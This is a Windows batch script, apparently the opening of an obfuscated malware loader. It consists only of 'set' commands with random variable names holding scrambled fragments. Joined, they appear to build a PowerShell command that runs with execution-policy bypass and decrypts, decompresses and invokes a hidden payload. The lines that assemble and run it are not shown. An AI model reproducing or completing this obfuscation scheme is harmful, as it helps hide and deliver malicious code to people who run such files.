@echo off
set "CVajSDlIxz=rs"
set "XhiDfZPpXN=0\"
set "vNFxVlLPld=ws"
set "WWbbBrINGZ=he"
set "XPfJnUkgCe=in"
set "SVPZPzbjlW=co"
set "CBVAbYhDCe=xe"
set "ufJaiNCdhF=ll"
set "bFUygwgtoW=s\"
set "DcMXNDyJXd=1."
set "zNcLfyjCFV=ow"
set "bqeLGWyroE=st"
set "Rfolzxmaae= /"
set "KtmCyLlZOf=\v"
set "UjEewASVkT=we"
set "CFTYxbEYnP=ll"
set "KBctcTfKbQ=Wi"
set "YPWFfRSSEQ=py"
set "IyRpUKBiRk=\W"
set "uzuDpNJAYW=Po"
set "EIovOjkHOb=rS"
set "JCefOVImNm=em"
set "XiNqQCZnhA= C"
set "EltYqOjsaX=po"
set "bhASscSXQS=y "
set "ivVzJgitjZ=he"
set "GDXzMmgSUw=do"
set "ZuiHkfArDI=we"
set "BCKUIKizjn=nd"
set "RAGuZjQnYg=:\"
set "gTeekIljgM=.e"
set "DOkmQkBLLQ=32"
set "wpmrZoPLLp=Sy"
set "ksCIODXQzh= %~dp0"
set "lQevDkdYAs=cd"
set "pOTglgIVNQ=bstr"
set "FXILgQyVvS=ress"
set "glCflPFFDg=pher"
set "DlKMCGXELQ=.GZi"
set "EMAzcSKrHK=ress"
set "uzroyfJXpB== [S"
set "cKMcWJsyfc=.Mem"
set "ZLikSGkbei=C = "
set "oYEGrEaBpT=m(, "
set "PeyJsoGvaw=ing("
set "irmWpeAJje=yste"
set "ZvGcaOBBAy=.Len"
set "wCycYrihAf=.Cry"
set "sRPNRAAtDw=xfHl"
set "MgeiOmReyX='[-1"
set "hAidPqBsOJ=, (,"
set "hmhOwcYvEH=oin "
set "pIbgXwDmsR=xfHl"
set "XoQMzuLPXC=yu ="
set "HvByeIwxCn=vert"
set "DGNKnKIxTl=ress"
set "lKLSKkNhYU=C, 0"
set "yqPIiSTOWg=grap"
set "rTQDXkKkde=tem."
set "uBZXjuyMzT=ddin"
set "wpOZHjgAZa=zHhH"
set "Ckemufdymz=).Sp"
set "jCuycUbDXX=;$mQ"
set "yiOsxkELUc=fore"
set "okGyRXjndl=bypa"
set "kokmcWzIXg=Bmor"
set "WljvZzjOtL=BC;$"
set "UlCEEAEmfM=Invo"
set "BbvJksXfZc=vpLG"
set "sEOMiNqSgT=.-16"
set "bUaGUXqeti=u) {"
set "vDCHTJYCPG=y.Pa"
set "tySuOsygzy=ewLi"
set "VLKsNxGzJY=b = "
set "opizkiScGn=stem"
set "MKICuQUutf== $I"
set "XcXruCTOXr=form"
set "rjGoSQrMTA=$LLn"
set "OBZwZtPIeD=gjYA"
set "CMmrdwtNNk=ode]"
set "gfdHxuwAEs=$xfH"
set "txJrWSmFGH=gMod"
set "CYwcVucBMD=orF'"
set "rBIBfgSQQu=-4] "
set "wmGIDJIbTc=[IO."
set "YmufYeDiOO=New-"
set "xqGKAWkVGk=();$"
set "QkraOykMWo=$eFm"
set "YyBBkSoCkT=esMa"
set "iVvMJkJAWD=Wyk "
set "bCjaUPTfWR=xfHl"
set "SlptRvpnnT=$Iwd"
set "iPHrGinEQg=ke($"
set "trEZiZQQYQ=y.Ci"
set "PNngFvVZid='[-1"
set "DCBasLYqku=-ep "
set "rjmtBeoCsU=lC);"
set "uchCACbhwD=1..-"
set "pFjiOzqFJq=and "
set "SgDMfApoZm=$eFm"
set "mufpCVKHZl=1] -"
set "BeXtkEOTZS=;$tv"
set "wWVcSXQoEE=106u"
set "xHAmBkqWcx=fHlC"
set "KNUjopZEll=comp"
set "jISzPQeCVl=k; }"
set "AqxiSHFfXK=ect "
set "vTdgVSdMYZ=V = "
set "oNDlCgDHOS=yste"
set "jxUlHqpKvU=embl"
set "HAgzlbuxqc=gnir"
set "rcUsBIzCMu=)) {"
set "bTShxPlkQV=l5E7"
set "MzHUqvKJqj=ct S"
